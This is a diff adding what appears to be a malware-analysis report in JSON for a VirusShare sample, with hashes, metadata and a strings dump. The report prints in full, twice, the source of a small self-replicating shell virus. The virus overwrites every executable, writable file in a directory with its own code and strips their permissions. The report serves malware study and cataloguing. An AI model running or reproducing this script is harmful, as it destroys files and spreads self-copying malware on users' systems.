@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "# Someone had to do it.\n# [Jaded] experiment in *nix 'viruses'\n# Overwriter SemiPoly :(\nfor file in *\ndo\nif test -x $file\n then\nif test -w $file\n then\nif test -f $file\n then\n# Techno Phunk\necho \"\">$file\ncp $0 .tmp\necho '#' $fileX >>$file\nfileX=$file\ncat .tmp>>$file\nchmod a-wr $file\nrm .tmp\nfi ; fi ; fi\ndone"
+    },
+    "filename": "VirusShare_dbc495aee04520fbd57fb245d8b835f5",
+    "filesize": 330,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "dbc495aee04520fbd57fb245d8b835f5",
+        "sha1": "af934880be9008f6053d0f326f41398596303976",
+        "sha256": "2d29bf7676deee09ecf8897fe8b16e12214b1586ea3efc43808505b4963241b8"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "# Someone had to do it.",
+            "# [Jaded] experiment in *nix 'viruses'",
+            "# Overwriter SemiPoly :(",
+            "for file in *",
+            "if test -x $file",
+            " then",
+            "if test -w $file",
+            " then",
+            "if test -f $file",
+            " then",
+            "# Techno Phunk",
+            "echo \"\">$file",
+            "cp $0 .tmp",
+            "echo '#' $fileX >>$file",
+            "fileX=$file",
+            "cat .tmp>>$file",
+            "chmod a-wr $file",
+            "rm .tmp",
+            "fi ; fi ; fi",
+            "done"
+        ],
+        "file": {
+            "cp $0 .tmp": "Temporary",
+            "rm .tmp": "Temporary"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.278425",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
